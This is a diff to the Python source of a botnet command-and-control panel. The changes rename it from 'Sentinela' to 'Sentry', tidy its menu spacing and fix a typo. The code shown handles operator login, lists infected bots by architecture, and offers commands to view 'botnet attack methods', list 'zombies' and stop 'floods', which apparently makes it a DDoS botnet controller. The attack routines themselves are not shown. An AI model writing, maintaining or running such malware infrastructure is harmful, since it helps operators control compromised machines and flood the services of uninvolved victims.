@@ -103,7 +103,7 @@ def list_arch_counts(client, send):
     send(client, f'\n{C}Bots Architectures:')
     for i, (arch, bot_list) in enumerate(bots_by_arch.items(), 1):
         if len(bot_list) > 0:
-            send(client, f"     {C}{arch}: {G}{len(bot_list)}")
+            send(client, f"{C}{arch}: {G}{len(bot_list)}")
     send(client, '')
 
 def removeAttacks(username, timeout):
@@ -282,7 +282,7 @@ def command_line(client, username):
     for x in banner.split('\n'):
         send(client, x)
 
-    prompt = f'{Fore.LIGHTBLUE_EX}Sentinela {Fore.LIGHTWHITE_EX}$ '
+    prompt = f'{Fore.LIGHTBLUE_EX}Sentry {Fore.LIGHTWHITE_EX}$'
     send(client, prompt, False)
 
     while 1:
@@ -295,13 +295,13 @@ def command_line(client, username):
             command = args[0].upper()
             
             if command == 'HELP' or command == '?' or command == 'COMMANDS':
-                send(client, f'{gray}Commands:           Description:')
-                send(client, f'{C}HELP{gray}                Shows list of commands')
-                send(client, f'{C}BOTNET{gray}              Shows list of botnet attack methods')
-                send(client, f'{C}BOTS{gray}                Shows all conected bots')
-                send(client, f'{C}STOP{gray}                Stop all your floods in progress')
-                send(client, f'{C}CLEAR{gray}               Clears the screen')
-                send(client, f'{C}LOGOUT{gray}              Disconnects from C&C server\n')
+                send(client, f'{gray}Commands: Description:')
+                send(client, f'{C}HELP{gray} Shows list of commands')
+                send(client, f'{C}BOTNET{gray} Shows list of botnet attack methods')
+                send(client, f'{C}BOTS{gray} Shows all connected bots')
+                send(client, f'{C}STOP{gray} Stop all your floods in progress')
+                send(client, f'{C}CLEAR{gray} Clears the screen')
+                send(client, f'{C}LOGOUT{gray} Disconnects from C&C server\n')
 
             elif command == '!ADMIN' or command == '!ADM':
                 if username == rootUser:
@@ -312,7 +312,7 @@ def command_line(client, username):
                 botnetMethods = botnetMethodsName('ALL')
                 send(client, f'{gray}Botnet Methods:')
                 for m, desc in botnetMethods.items():
-                    send(client, '\x1b[3;31;40m' + f"{C}{m}       {gray}{desc}")
+                    send(client, '\x1b[3;31;40m' + f"{C}{m} {gray}{desc}")
                 send(client, '')
             
             elif command == 'BOTS' or command == 'ZOMBIES':
@@ -407,12 +407,12 @@ def command_line(client, username):
         del clients[client]
 
 def handle_client(client, address):
-    send(client, f'\33]0;Sentinela | Login\a', False)
+    send(client, f'\33]0;Sentry | Login\a', False)
 
     # username login
     while 1:
         send(client, ansi_clear, False)
-        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
+        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}:', False)
         username = client.recv(1024).decode().strip()
         if not username:
             continue
@@ -421,7 +421,7 @@ def handle_client(client, address):
     # password login
     password = ''
     while 1:
-        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
+        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK}', False, False)
         while not password.strip():
             password = client.recv(1024).decode('cp1252').strip()
         break
